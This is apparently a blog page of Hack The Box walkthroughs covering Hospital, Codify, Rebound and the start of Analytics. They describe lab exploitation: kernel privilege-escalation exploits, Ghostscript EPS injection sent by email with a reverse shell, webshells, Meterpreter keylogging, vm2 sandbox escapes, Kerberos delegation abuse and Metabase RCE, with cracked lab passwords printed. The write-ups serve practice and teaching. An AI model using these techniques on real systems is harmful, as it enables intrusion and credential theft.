This is consistent with the results of my initial scanning. It’s likely either a Docker container or a virtual machine running on the Windows OS. There are no indications this is a Docker container, so I’ll lean VM.
There is one user in this VM, drwilliams:
www-data can’t access their directory.
There isn’t much of interest on the box besides web activity. The process list shows Apache workers and not much else. I’ll look at the website. Apache is configured to serv from /var/www/html:
/etc/apache2/mods-enabled/php7.4.conf shows what files are processed as PHP:
The /var/www/html directory has the web application:
config.php handles the database connection:
I’ll note those creds.
mysql is in the VM and with the creds I’ll explore the database. There’s only one interesting table:
It has only one table:
There are two rows in the table that I didn’t create:
I’ll try to crack these with hashcat as mode 3200, and they do both crack (admin to “123456” and patient to “patient”), but these aren’t important to solving Hospital.
There are likely several exploits to get root in the VM from here. I’ll show two, the author’s intended method (CVE-2023-35001) and how I solved it originally (GameOver(lay)).
The Kernel on this VM is from Feb 2023:
The GameOver(lay) vulnerability, CVE-2023-2640 and CVE-2023-32629 came out in July 2023, after this, which suggests this may be vulnerable.
I did a video GameOver(lay) Explained less than a month ago, that’s worth checking out here:
The POC for this is very short:
Pasting that in works, as long as I’m in a directory that www-data can write in (specifically it needs to create directories):
The user id in the id output is root. I’ll change id at the end to bash and get a shell:
Searching for this kernel will turn up references to both GameOver(lay) and CVE-2023-35001:
CVE-2023-35001 became public a few weeks before GameOver(lay) and is an issue with the netfilter subsystem.
I’ll grab a POC exploit for this vulnerability and clone it to my host:
The instructions say to run make, and as I already have go installed, it just works:
I’ll need to upload both exploit and wrapper to the target. I’ll host a Python webserver in this directory, and fetch them with wget:
Both need to be executable, and then I run exploit:

Category: Shell as drbrown
There isn’t much still on the server, but as root I can access  the shadow file that stores the hashes for users on the system:
I’ll save these to a file and give them to hashcat:
The first hash isn’t recognized (it’s yescrypt), but the second cracks as a sha512crypt to the password “qwe123!@#”.
This password works for drwilliams over SMB as well:
drwilliams does not have WinRM access:
It does work over SSH, but this just lands me back in the VM that I was already root in:
drwilliams is able to list SMB shares:
Investigating the shares shows they are relatively empty.
I’ll also check drwilliams’ webmail account, and the password works:
Sent and Trash are both empty, but there’s a single email in Inbox:
Chris Brown is waiting for a .eps file to run with Ghostscript.
There was a code execution vulnerability in Ghostscript with dates in July 2023:
This is CVE-2023-36664, a command injection vulnerability in the Ghostscript processor when an Embedded PostScript (EPS) file is opened. The vulnerability abuses host the pipe character is handled.  This post from Kroll has a lot of nice details.
This repo has a POC to exploit this vulnerability. I’ll get a PowerShell reverse shell one-liner from revshell.com, and use it as the payload. Following the syntax shown in the README, I’ll generate a file to run this:
Looking at the new payload, there is a %pipe% reference right before my payload:
I’ll attack that as an email to drbrown:
After a minute or so, there’s a connect at my listening nc:
And I can finally grab user.txt:
In drbrown’s Documents folder there’s a ghostscript.bat file:
This file is running gswin64.exe (Ghostscript) on a given file in drbrown’s Downloads directory as drbrown:
That seems like the script responsible for opening the attachments. It’s also got drbrown’s password, “chr!$br0wn”. I’ll look more into the automations that simulate the user opening the .eps files using Ghostscript in Beyond Root.
The password does work for drbrown on SMB:
It also works for WinRM:
I’ll use Evil-WinRM to get a shell:

Category: Shell as administrator
There are multiple ways to get from drbrown to the root flag. I’ll show four:
I believe that the XAMPP unintended is the path that most people took while solving this box. The keystrokes method was the intended and most interesting. The automation script is something I stumbled across while trying to understand the automations.
xampp is installed at the root of the filesystem:
IIS is more common on Windows, but xampp is another webserver stack. There is a lot in this directory, but the htdocs folder is where Apache typically has its webroot:
The index.php file shows that this is RoundCube:
I don’t have a good way to figure out what user XAMPP is running as, but it’s worth exploring if there’s a way to get execution through it.
I’ll start with getting the permissions on the htdocs directory:
Local Service and System have Full Control (F) as expected. It is not expected that all users have RX (read and execute), as well as AD (Append data/add subdirectory) and WD (Write data/add subdirectory). This means all users can write here.
I’ll upload a simple webshell (there are no disable_functions in this instance):
Now on visiting it, I get execution as System!
I’ll replace “whoami” with the PowerShell reverse shell from before and it hangs. At nc:
There’s good enough for root.txt:
qwinsta (docs) will show information about all the active sessions on the box:
The > shows the session the current console is running in, with ID 0. There is another user, drbrown, logged in to an interactive session with ID 1. I got a similar result recently on Reboud and used it with a cross session relay attack to get authenticated as the logged in user. In this case, the logged in user is the same user I am currently authenticated as, just in an interactive session.
The strategy here is to monitor what the logged in user is doing. To best do this, I’m going to use Metasploit / Meterpreter, which comes with plugins for things like taking screenshots and capturing keystrokes.
To get a Meterpreter session, I’ll use msfvenom to create an exe:
I’ll start msfconsole, and use exploit/multi/handler. I’ll set the payload and the LHOST and run:
Back in Evil-WinRM, I’ll upload the malicious exe and run it:
I get a session at the Metasploit listener:
I’ll start by getting a screenshot of what is currently up on the user’s screen using the espia extension:
It fails because my process is not in the session that the active user is in. If I look at the processes being run by drbrown, I’ll see that rev.exe is one of the only ones in session 0:
I’ll migrate to explorer.exe (which is usually a good target):
Now it works:
The user is logging into the webmail instance as administrator using what looks like Internet explorer. I’ll note that Internet Explorer is in the process list above.
Meterpreter has had a Keystroke Sniffer since 2009. To use the keystroke sniffer, I have to be in a process with an interactive desktop, which I already am. keyscan_start is the command to start sniffing:
It is now constantly checking GetAsyncKeyState to check for what keys are down and logging it. This is prone to occasional errors. When I want to get a dump of what’s been typed, I’ll enter keyscan_dump. After 2 minutes or so, I’ll dump, and get:
These creds work for the administrator user for both SMB and WinRM:
Both say “Pwn3d!”, meaning I can get a shell with them.
The cleanest way to get a shell is Evil-WinRM:
And read the flag:
RDP is open on Hospital, and given that drbrown can connect over WinRM, it’s likely that they can connect to RDP as well. I’ll open remmina and create a new profile:
On clicking “Save and Connect”, I’m connected to the box as drbrown:
The password is obfuscated by the HTML password input, but the little eye icon offers the chance to see it. Clicking on it reveals the password:
It can be a bit finicky, depending on the state of where the user is typing when I RDP in, sometimes it doesn’t let me click. The more reliable way is to open the dev tools (gear icon at the top right) and get it through the console:
I didn’t find this path until after I had already got administrator access and was exploring how the automations for the box were configured.
As drbrown, I don’t have access to the scheduled tasks:
As administrator, this one jumped out as interesting:
Why is Python running a .vbs file?
While I originally only identified this script by viewing schedule tasks as administrator, there’s nothing to stop a user as drbrown from noticing this odd VBS / Python script in C:\Windows\System32 and taking a look:
It runs an infinite loop of clearing the user box, writing “Administrator”, sleeping 3 seconds, moving to the password box, typing the password, and then sleeping about two minutes. It’s using Selenium to automate the browser loading the page and PyAutoGUI to manage the typing into the form on the website. With access to the script, I can grab the password and login as above.
When I finish a box, I always like understanding how the box is set up to make it work. For Hospital, there are two simulated user steps that caught my attention. The first is the user entering the admin password into the webmail instance (which turned into an alternative root step above). The other is how the emailed .eps files would be opened by Ghostscript. I saw a little of that in the .vbs script in drbrown’s Documents folder.
RoundCube is a webmail server, but it needs a mail server behind it that manages the actual sending and receiving of mail. In this case, looking in C:\Program Files (x86), hMailServer is installed:
The installation looks like:
The hMailServer docs have a page on Scripting:
hMailServer 4.0 and later enable you to write your own scripts to extend the server’s functionality. Support for Microsoft VBScript and Microsoft JScript currently exists in the server. You will find at hMailServer.com useful sample scripts written in VBScript. For general script syntax, you should consult the Microsoft MSDN library.
All hMailServer scripts should be placed in a file called EventHandlers.vbs. The file is found in the hMailServer Events directory, normally C:\Program Files\hMailServer\Events.
That file exists!
The script it:
Somehow in the hMailServer admin, it must be running the SaveAttachment function on each received email. This will loop over the attachments, saving each in the Downloads directory in drbrown’s profile.
I think the next part is probably a logic error in the script. It will check the last attachment’s filename to see if it ends with “.eps”. It should probably be checking each attachment in a loop. But given most HTB players will only send one attachment, it probably doesn’t matter much.
If that attachment has the .eps extension, it calls ghostscript.bat, passing the filename in as an argument. If not, it deletes the file.
The script looks to have been very likely adapted from the script in this post on the hMailServer forum.
I identified ghostscript.bat earlier, but didn’t look at what it does:
It sets the input argument (known to be the filename) to the variable filename. Then it runs powershell, first creating a credential object as drbrown, and using it to Invoke-Command. That’s because hMail is likely running as System or a service account, but this script is simulating user activity as drbrown. The command that’s called with Invoke-Command is gswin64c.exe with the -dNOSAFER option and the filename passed in.
This is the Ghostscript binary, and the -dNOSAFER flag is, according to the docs:
-dNOSAFER (equivalent to -dDELAYSAFER).
This flag disables SAFER mode until the .setsafe procedure is run. This is intended for clients or scripts that cannot operate in SAFER mode. If Ghostscript is started with -dNOSAFER or -dDELAYSAFER, PostScript programs are allowed to read, write, rename or delete any files in the system that are not protected by operating system permissions.
This mode is required for the exploit to work.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 04 Nov 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.11s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  pppCategory: Recon
nmap finds three open TCP ports, SSH (22) and two HTTP (80 and 3000):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 22.04 jammy. There’s also Node.js on 3000.
The site on port 80 is redirecting to codify.htb. I’ll fuzz both 80 and 3000 to see if any subdomains of codify.htb respond differently, but not find anything. I’ll add the domain to my /etc/hosts file:
Both TCP ports 80 and 3000 are hosting a webserver, and on first glance, they appear to be the same page.
Looking at the HTTP headers for each, they are very similar. On 3000:
On port 80:
The main difference is that on 80 there is an additional Apache Server header. This seems like a case where the application, running in JavaScript, is listening on 3000, and Apache is acting as a reverse proxy that handles the traffic to the application, providing services like load balancing. Typically 3000 would only be listening on localhost or on a non-publicly available server, but it can happen that both are accessible.
I can confirm this later when I get a shell by looking at /etc/apache2/sites-enabled/000-default.conf.
The site is for an online JavaScript sandbox:
The “limitations” link goes to /limitations, which talks about what modules are allowed to run:
It’s blocking things like child_process to prevent users from running commands on the system, and fs to prevent interacting with the files on the filesystem. There’s a list of supported modules, as well as an email address which I’ll note.
The “About us” link (/about) has some background information, with details on the editor:
It’s using the vm2 NodeJS package, and the link goes to a specific release on GitHub, v3.9.16.
/editor presents a form to enter JavaScript code:
On entering some JavaScript code and submitting, the output is shown on the right:
Brute forcing web paths with feroxbuster doesn’t find anything else of interest.
The HTTP response headers show Apache with NodeJS / Express framework:
The site tells me that’s what it’s running, so nothing exciting here. I know it’s using vm2 version 3.9.16 as well.

Category: Shell as svc
vm2 is a JavaScript sandbox, designed to run a limit set of JavaScript code in a safe manner preventing the code from reaching outside the sandbox. This would be used in cases where an application wanted to run code from untrusted sources (like in Codify, where the user is allow to submit arbitrary code).
If an attacker can escape the sandbox, they would have access to the full scope of JavaScript commands, which would include the ability to run arbitrary commands on the host OS.
Searching for “vm2 exploit” returns a lot of results for several different CVEs in vm2:
The synk page for vm2 shows a bunch of vulnerabilities and what version they are vulnerable in. From this list, it seems like several might be good candidates for Codify:
CVE-2023-37903 links to this GitHub Issue, which talks about shutting down the entire project as it cannot be secured. On the vm2 Github repo security tab there are a bunch of issues, each with POCs:
There are four critical RCE CVEs that should work on version 3.9.16:
In checking out different POCs, they are each structured like this:
Thinking about what the website is doing, it is handling the vm2 setup and calling the code. I’m only passing in what I want to be run. So when looking at these POCs, I’ll want to only copy the code variable value.
There are four known CVEs that will work to get RCE here. One works completely as is, and the others take some small changes to show execution. I’ll show all four, though any one will work to get execution.
This CVE is the most straight-forward to exploit as testing it requires no modification at all. It escapes the sandbox using the Proxy object. This page on Snyk, or this POC linked to from the Security tab give the same POC:
The POC will run echo hacked, and on pasting it into Codify, it works:
The next most straight forward to exploit is CVE-2023-30547, which has to do with raising an exception inside of handleException(). There is POC code linked to on the GitHub security issue as well as a POC on ExploitDB (which is incorrectly linked to on the CVE-2023-37466 page on Snyk).
The code part looks like:
The only trick here is seeing that it is using the child_process module’s execSync function to run touch pwned, which will create a pwned file in the current directory. That doesn’t help much at this point, as I don’t have access to the filesystem to see the result. I’ll want to change it to something I can see, like id, and then paste it in, and the result is the output of that command on Codify:
CVE-2023-37903 abuses how NodeJS allows for a custom inspect function to be defined:
This POC has the same issue that I need to change the payload from touch pwned to something else, but even then, it doesn’t show the result:
What’s returned is a JavaScript Promise object. There are probably ways to get the result from this, but I wasn’t able to figure it out with my limited JavaScript skills. Instead, I’ll test a blind payload, like ping. I’ll start tcpdump on my host listening for ICMP packets, and then run ping -c 1 10.10.14.6 (the -c 1 is important on Linux systems as without it, ping will run forever):
An ICMP packet arrives at my host, which is evidence that the code executed.
This vulnerability is in the Promise handler:
It is the same as the previous one, though it returns [object Object]. Changing it to ping works here as well.
I’ll update my payload to a simple bash reverse shell, and start nc listening on the same port:
On sending the code, the site hangs, but there’s a connection at nc with a shell as the svc user:
I’ll upgrade my shell using the standard trick:

Category: Shell as joshua
The home directory for svc is basically empty (there is a pwned file I must have created pasting a POC exploit in):
There’s one other directory in /home, but svc can’t access it:
There are three directories in /var/www:
html has the default Apache landing page.
editor has the source code for the web application on 80/3000:
contact seems to have a different web application that doesn’t seem to be running on Codify:
I don’t see this application running anywhere (it’s not configured in Apache or running with pm2), but I’ll still take a look. It’s another Express application:
It’s also loading ticket.db at the top of the application as a SQLite database.
To get a quick look at the routes, I’ll grep:
There’s login functionality as well.
The database file has two tables:
.schema will give information about the columns in each table:
tickets doesn’t have anything interesting:
users has a single row:
I’ll save that hash to a file and pass it to hashcat:
It tries to match the hash format, but there are four options it finds that could match. There’s a few ways to figure this out:
I’ll try again with the basic Blowfish, 3200:
It cracks to “spongebob1”.
That password works for joshua with su:
It also works for SSH:
joshua has access to user.txt:

Category: Shell as root
joshua can run a backup shell script as root:
At a high level, the script is meant to do a dump of the MySQL database and save it into a backup directory:
It reads creds from /root/.cred, and prompts the user to enter the root password. It checks that they match, and then proceeds to get a list of databases and then save each to a compressed file.
There are two potential issues in this script:
Because $USER_PASS is not in ", I can easily bypass this check, and with a bit more work, recover the value of $DB_PASS.
This is much easier than the Hackvent case because I don’t need to recover the password in the Bash glob vulnerability. Still, it can be done that was as well. I’ll show both:
When the script is run, it prompts for a password:
Entering the wrong password exits the script:
However, entering “*” (the input is not shown on the terminal because the -s flag is used with read) bypasses the check:
To watch for the processes, I’ll upload PSpy. I’ll download the latest release (v1.2.1 at the time of writing this post), and save it in /opt on my host. Now I’ll serve that directory with a Python web server:
I’ll fetch it from Codify:
I’ll set it as executable and run it:
Once it gets through all the start up, in a different session as joshua, I’ll run the script again, entering “*” as the password. PSpy won’t catch it every time, but after a run or two, I’ll catch the command line for mysqldump:
The password is “kljh12k3jhaskjh12kjh3” (as -p is the flag for the password).
The trickier route is to abuse the unsafe comparison with wildcards to test the password. For example if I enter “a*” as the password, it fails:
If I enter “k*”, it works:
I can give the password without waiting for the prompt as well, but piping it into the process:
Putting that together, I can write a Python script that will try all characters to find the password:
Running this takes 35-40 seconds, and finds the password:

I can make this faster. It hangs each time it finds the correct password because the process on success takes longer to run. What if I give subprocess.run a timeout? I’ll have to assume that any time it hits the timeout, it’s because the password was accepted:
Running that gets down under 20 seconds:
Minor improvement, so probably not worth it here, but if the delay on success was longer, it would definitely be!
With the password, I can su to root:
And grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 09 Sep 2023
OS : Windows
Base Points : Insane [50]
Nmap scan:
Host is up (0.092s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49681/tcp open  unknown
49688/tcp open  unknown
49724/tcp open  unknown
55738/tcp open  unknownCategory: Recon
nmap finds a lot of open TCP ports on Rebound:
This combination of ports looks like a Windows Domain Controller. There’s an alternative name on the TLS certificate on some of the ports giving dc01.rebound.htb. Many of the ports show the domain rebound.htb.
Based on these ports, I’ll prioritize as:
I will add the hosts to my /etc/hosts file:
Having dc01 in there will prove important later.
netexec shows the same thing as the nmap output:
The guest user is able to list shares:
These are the standard shares on a DC, plus Shared.
There are no files found that can be accessed with a null auth.
I’ll perform a RID Cycling attack to enumerate users:
By default, typical RID cycle attacks go up to RID 4000. For a larger domain, it may be necessary to expand that, so I’ll switch to lookupsid.py (though netexec works as well by adding the max number to the option like --rid-brute 10000). Trying 10,000 does find more users (I don’t find any above 8,000):
I’ll run that again to make a users list:

Category: Auth as ldap_monitor
Without creds, I can look for users that have the DONT_REQUIRE_PREAUTH flag set using the Impacket script GetNPUsers.py. It finds one:
netexec can also do this as well:
It saves the hashes to the specified output file, in this case, asprephashes.txt.
I’ll take this over to hashcat and try to crack it, but it doesn’t crack on rockyou.txt, which means it’s likely not meant to be cracked on HTB.
Typically I think of Kerberoasting as something I can do once I have at least one domain user’s creds. But this research from Charlie Clark in Sept 2022 showed that it is possible to abuse a user with DONT_REQUIRE_PREAUTH to Kerberoast other users. The post summarizes:
Therefore, if any account is configured to not require pre-authentication, it is possible to Kerberoast without any credentials. This method of Kerberoasting has been implemented in Rubeus within this PR.
It’s also implemented in GetUserSPNs.py from this commit, though I had to install it from GitHub rather than PyPI to get it working (pipx install git+https://github.com/fortra/impacket).
To Kerberoast this way (ASPERKerberoast?), I’ll use the -no-preauth flag, giving it the account that does not require preauth, jjones, as well as the -usersfile, the -dc-host, and the domain:
It finds hashes for several accounts. I’ll save these to a file:
Without trying, I think it will be very unlikely that the krbtgt, DC01$, or delegator$ accounts will crack. Those are all machine accounts or otherwise internally managed accounts, and likely to have a long complex password. I’ll start with ldap_monitor:
This hash cracks very quickly:
The others don’t crack with rockyou.txt.
These creds work for SMB, but not WinRM or LDAP:
The LDAP failure is weird. Typically, any domain use can at least connect to LDAP. It turns out that the host is configured with the LDAP Channel Binding Policy is set to Always, which is designed to prevent NTLM relay attacks (see this neat video).
If I try netexec against with the -k flag to force Kerberos, it does work:
At this point, with legit creds, there’s a lot I can collect, but I’ll save it for the next step when it’s most useful.

Category: Auth as OOrend
Given that ldap_monitor seems like a shared account, I’ll check to see if the password is reused with any other users. I’ll need the --continue-on-success flag to keep going after verifying the password works for ldap_monitor:
oorend uses the same password!
Still no WinRM, and the same thing happens with LDAP:

Category: Shell as WinRM_svc
With access to two users, I can pull Bloodhound data with either of them:
The script does hit the issue with LDAP, but it smart enough to work through it.
It turns out that the version of Bloodhound Python that was out when Rebound released didn’t collect the data necessary for the next step. I’ll show that version here, as well as the latest version at the end.
Bloodhound doesn’t show any kind of outbound control from either ldap_monitor or oorend. Typically this is where I move to other stuff, but without much else, I’ll look around what what interesting targets might be. The “Shortest Paths to High Value Targets” query shows this spegehitti:
The top right of the chart jumps out as interesting. Two users in the ServiceMgmt group, which has GenericAll on Service Users, which contains WinRm_SVC. WinRm_SVC can also PsRemote into the DC, which is something I probably need.
powerview.py is a neat tool for doing deeper analysis of Windows object properties remotely. Based off the no-longer-maintained powerview.ps1 (still available here).
Without -k, it won’t connect (just like above), but on adding it, it does:
From the PV > prompt, I can run typical PowerView commands. When I get to looking at the ACL on the RemoteMGMT group, there’s an interesting entry:
oorend has Self rights over this group, which means they can add themselves to it.
The latest version of Bloodhound Python will crash on running with -c all:
Running without ObjectProps works:
And shows the path from OOrend to WinRM_SVC under paths from Owned Principals:
I’ll add the oorend user to the ServiceMGMT using Powerview commands:
This could also be done with bloodyAD, another tool I’ll use a lot on this box:
After running this (either way), oorend is now in the group:
With full control rights over the ServiceMGMT OU, I can give oorend GENERICALL over the users in the OU:
Now oorend has FullControl over WinRM_svc:
With full control over the ServiceMGMT OU, I get the same control over the users in that OU, most interesting WinRM_SVC. There are many ways to get access as that user from here. I’ll show two.
The most obvious way I could think of was to just change the user’s password. This can be done with bloodyAD:
And now I have access:
And can get a shell:
And get the flag:
A more careful way (and the author’s suggested method) is to use a Shadow Credential, similar to what I showed in Absolute and Outdated.
That provides the hash for the account, which I can use with Evil-WinRM:
This method is far superior, in that it’s more stealthy (I haven’t modified the password, only added alternative credentials).

Category: Auth as TBrady
There’s nothing else in winrm_svc’s home directory:
Nothing jumps out as interesting in C:\Program Files or C:\Program Files (x86). The root of the file system is pretty bare, with only the empty Shared folder (presumably the SMB share) at all unusual:
There’s nothing interesting with ADCS. Getting certipy working was slightly interesting, so I’ll show that here (though one can skip to the next section without missing anything as far as solving the box).
When I run the standard certipy search to look for vulnerable templates, it fails due to LDAP channel binding (just like above):
It is nice enough to tell me two options to add. Trying to run this again raises another error:
After installing the module, it works:
Though in working it fails to find any vulnerable templates.
Looking at the running processes, something interesting:
There’s a bunch of processes in session 1. Typically on HTB machines when no one is logged in, I’ll see LogonUI and a couple other processes, but here explorer is running, and it looks like someone is actually logged in.
qwinsta is the command to display information about the session host, but it fails:
I came across this Security Stack Exchange post, which doesn’t explain why, but shows that RunasCs.exe makes it work (and this author is likely trying to solve Rebound). I’ll download the latest release and upload it to Rebound:
Now only does it work, but it shows the TBrady user is logged in:
TBrady has ReadGMSAPassword on the Delegator$ account, which seems like it might be interesting:
It seems like that’s my current target.
I’m going to abuse the logged in session by TBrady by triggering an authentication back to my box and relaying it to dump a hash. I did something similar in Absolute, but there I got the administrator account, which allowed me to just add an admin user and be done. Here I’ll be targeting the TBrady user, so what I can get via relay is more limited.
There’s a couple ways to do this:
I’ll show both.
RemotePotato0 is a tool that:
It abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.
Here, since I’ll be targeting a non-admin user, I’ll focus on the hash grab. I’ll upload the latest release:
To run it, I’ll use the following options:
These kind of RPC connections will only target TCP 135. Since I can’t listen on TCP 135 on Rebound (it’s already listening with the legit RPC service), I’ll have the exploit target my host, and then forward that back to RemotePotato0 on 9999.  I’ll run socat on my box sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999. So the traffic will hit my host on 135 and go back to Rebound on 9999, where RemotePotato0 is listening.
When I run this, it dumps a NetNTMLv2 hash for TBrady:
I’ll clone KrbRelay to my Windows VM and compile it in Visual Studio (just like in Absolute). I’ll upload it to Rebound:
I’ll run it just like the example in the README.md under NTLM, except I’ll use RunasCs.exe to get into a /netonly like session just like with qwinsta:
It also gives a NetNTLMv2 hash.
Regardless of how I collected the NetNTLMv2 hash (really more a challenge / response than a hash), I can save it to a file and give it to hashcat:
The hash cracks as “543BOMBOMBUNmanda”.
These creds work for SMB and LDAP, but not WinRM:
The lack of WinRM isn’t surprising, as TBrady is lacking any group that would enable that:

Category: Auth as delegator$
TBrady has ReadGMSAPassword over the delegator$ account. I’ll show three different tools to collect the NTLM hash of delegator$ using GMSA.
I already noted above that TBrady has ReadGMSAPassword on Delegator$. This page from Hacker Recipes has a bunch of ways to do it. I’ll use bloodyAD to dump it:
Alternatively, the BloodHound documentation suggests GMSAPasswordReader. I’ll clone the repo and build it in my Windows VM, and then upload it to Rebound:
Running it as TBrady works:
The “Current” rc4_hmac is the NTLM hash, matching the one from bloodyAD.
netexec can get the NTLM for the delegator$ account as well:
The hash works for SMB and LDAP but not WinRM:

Category: Shell as Administrator
In Bloodhound, looking at the now owned Delegator object, there’s information about delegation:
It does not have unconstrained delegation, but it is allow to delegate HTTP  for the dc01 machine object. It also has a SPN of browser/dc01.rebound.htb.
The Impacket script findDelegation.py will also show this:
To think about constrained delegation, let’s take an example of a web server and a database server. The user auths to the webserver, and the by sending it’s Service Ticket (ST, also known as Ticket Granting Service or TGS ticket) to the webserver. The webserver wants to auth as the user to the DB to only get stuff that the user is allowed to access. It sends a special TGS request to the DC asking for auth to the DC, and attaching the ST or TGS ticket from the user. The DC will check that the webserver is allowed to delegate to the DB server and that the ST / TGS ticket from the user has the forwardable flag. If so, it returns a ST / TGS ticket that says this is the user trying to access the DB. This all makes use of the S4U2Proxy extension.
So what happens is the user doesn’t use Kerberos to authenticate to the web server (perhaps NTLM)? The web server needs a ST / TGS ticket for the user to the web server to request one for the DB. The web server can request a ST / TGS ticket from the DC for the user to the webserver using the S4U2Self extension. This ticket will only come back with the forwardable flag if the delegation is configured as “Constrained w/ Protocol Transition”.
The delegation above doesn’t have the “w/ Protocol Transition” part, so I can’t just request a ST / TGS ticket and get access as any user to the DC.
To demonstrate this, running getST.py fails:
It is using S4U2Self to get a ticket for the administrator user for delegator$, and then trying to use S4U2Proxy to forward it, but it doesn’t work. The -self flag tells getSt.py to stop after the S4U2Self, getting a ticket for administrator for delegator$. The resulting ticket is missing the forwardable flag:
In the above constrained delegation, the DC tracked on the web server object that it was allowed to delegate (without protocol transition) for the DB. In resource-based constrained delegation, it’s similar, but the DC tracks a trusted list of accounts on the DB object what services are allowed to delegate to it, and the resource can modify it’s own list.
To move forward with this attack, I’m going to set ldap_monitor as a trusted to delegate account for delegator$ using the rbcd.py script from Impacket.
All of this together updates the RBCD list:
One other note - I lost a ton of time getting “invalid server address” errors for not having “dc01” associated with the IP of the box in my /etc/hosts file.
Now, the ldap_monitor account is able to request a service ticket as any user on delegator$. I’m going to target the DC computer account, because the administrator account is marked as sensitive, which gives the NOT_DELEGATED flag:
I’ll get a ST / TGS ticket as DC01$ on delegator$ with getST.py:
There is a cleanup script resetting delegation, so if this doesn’t work, I’ll make sure to re-run the rbcd.py script above.
This saves a ST / TGS ticket as the DC computer account for delegator$ into a file, and this time it is forwardable:
This is what was missing above.
Now that I have a ST / TGS ticket as DC01$ for delegator$, delegator$ can use that along with the constrained delegation to get a ST on DC01 as DC01.
With this ticket as the machine account, I can dump hashes from the DC. The KRB5CCNAME environment variable will point to the ticket, and then the -k and -no-pass options will tell secretsdump.py to use it:
With the admin hash, I can pass that to Evil-WinRM to get a shell:
And root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 07 Oct 2023
OS : Linux
Base Points : Easy [20]
Creators : 7u9yTheCyberGeek
Nmap scan:
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy. The webserver is redirecting to http://analytical.htb.
When I try to access the page via the IP address, the server returns a 302 redirect to http://analytical.htb. When I visit that URL, I get the page. This means the server is doing host-based routing. I’ll use ffuf to try a subdomains of analytical.htb to see if any returns anything different with the following options:
This identifies data.analytical.htb returns something different.
I’ll add both these to my /etc/hosts file:
I’ll scan both of these with nmap, but nothing new worth nothing comes out.
The site is for a data analytics firm:
All of the links at the top lead to sections of the main page, except for “Login”, which goes to data.analytical.htb.
There are some names in the “Our Team” section. There’s a contact form, but submitting it doesn’t actually send any data to the server, so that’s likely a dead end.
There is an email address, due@analytical.com
The main page loads as index.html, which suggests this is a static site.
The HTTP response headers don’t show anything besides nginx:
The 404 page is the standard nginx page:
I’ll run feroxbuster against the site, and it finds nothing:
This site offers a login page to an instance of the open-source data analytics platform Metabase:
I don’t have creds, so not much to do here.
The HTTP response headers still show nginx, but there’s a lot more:
Nothing super interesting.
Looking at the Metabase GitHub page shows it’s Java-based (under releases, it offers a .jar file). I’ve love to find something that leaks a version, but I don’t find anything.

Category: Shell as metabase in container
Searching for “Metabase exploit” returns a bunch of references to CVE-2023-38646:
This is definitely worth looking at.
The security advisory from Metabase is very vague about the issue. Luckily, this blog post from Assetnote goes into detail on this vulnerability.
Metabase has this token called the setup-token that is needed to run the initialization / setup for the application. Typically, when the user visits the instance, if setup is complete, they are redirected to login. If it is not, then the setup-token is embedded in the page and they are redirected to the setup process. Metabase intended that the setup-token be deleted once setup is complete. However, starting from a commit made in January 2022, the token was no longer cleared. Worse, remains available to unauthenticated users in two places:
With the token, a request to /api/setup/validate with a malicious db connection allows for the execution of arbitrary commands.
There are plenty of exploits out there I can find with a quick search, but this exploit is simple enough that I will do it manually to really understand what it’s doing.
Visiting /api/session/properties returns a huge JSON blob. I know there’s a setup-token in there somewhere. I’ll start by using jq to get the top level keys. There are 60, and setup-token is one of them:
Because there’s a “-“ in the key value, I’ll need to wrap it in double quotes:
The blog post uses this HTTP POST request to exploit:
I’ll need to update the token. There’s a command in the db key that is running bash -c with an echo of some base64-encoded data into base64 -d and then into bash -i (it’s using brace expansion to replace spaces).
I’ll create a bash reverse shell in the same format:
It’s not strictly required, but I don’t love the special characters, so I’ll add some spaces to the command string until they are gone:
So my db string will be:
With nc listening on 443, I’ll find a request to data.analytics.htb in Burp, and send it to Repeater. It doesn’t matter what it is, as I’m going to completely change it (I just want the target to be set correctly). In the Request pane, I’ll update the Host header from localhost to data.analytical.htb, the token, and the db string:
When I send, it hangs for a second, and then at nc there’s a shell:
I mentioned above there were many POC scripts available on GitHub. For example, I can grab this one and save it as a file on my VM.
Taking a quick look at the script, it’s doing the same thing I did above. It takes the URL, token, and the command to run. I don’t know why it doesn’t get the token for me (it would be just one more request and parsing JSON, a couple lines of Python). The script takes the input URL and builds the validate endpoint, and the request:
The input command is base64 encoded, and then used in the request in the same brace-expanded format:
Running this is very simple:
While it returns an error here, it also returns a shell at nc listening on 443.

Category: Shell as metalytics
I can try a shell upgrade, but neither script nor python are installed. This smells like a container. Additionally, the hostname is random characters. There’s a .dockerenv file in the system root:
And the IP address is 172.17.0.2, not 10.10.11.233 that I’d been interacting with:
The file system is pretty bare. Metabase is in /app:
There is a single user with a home directory, but it’s completely empty:
env will show the environment variables:
META_USER=metalytics and META_PASS=An4lytics_ds20223# jump out as interesting!
